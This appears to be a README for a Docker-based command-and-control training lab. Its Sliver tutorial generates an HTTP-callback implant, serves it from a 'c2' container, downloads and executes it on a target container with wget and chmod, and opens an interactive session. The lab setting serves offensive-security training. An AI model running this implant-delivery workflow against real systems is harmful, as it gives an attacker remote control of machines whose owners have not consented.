# Command and Control (C2)

## Supported C2
- [Metasploit](https://www.metasploit.com/get-started)
- [Sliver](https://github.com/BishopFox/sliver/wiki/Getting-Started)

## Metasploit Tutorial
- TODO

## Sliver Tutorial
1.  Run `c2` and `travesty` containers
```
docker compose up -d c2 travesty --build
```

2. Docker exec into c2 box
```
> docker ps
> docker exec -it CONTAINER_ID bash
```

3. Enter Sliver Server Shell
```
> sliver-server
```

4. Generate implant that will call back to c2 over http/s
```
[server] sliver > generate --os linux --http c2.local --save my_implant
```

5. Deliver implant to `travesty`\
    For our tutorial, we'll just serve the implant from `c2` with
    ```
    python3 -m http.server
    ```
    and fetch it from `travesty` and add executable permissions using
    ```
    wget http://c2.local:8000/my_implant && chmod +x my_implant
    ```

6. Run HTTP listener on Sliver Server
```
[server] sliver > http
```

7. Execute implant on `travesty`
```
./my_implant
```

8. Watch the Sliver Server prompt until you see a new session notification from the implant callback (upon execution, or in 30s or 60s retry intervals), then check the sessions list to see the active session details
```
[server] sliver > sessions
```

9. Enter the session using the implant's name as shown from the previous `sessions` command
```
sliver > sessions --interact MISLEADING_SMOKE
```

10. Type `help` to see available options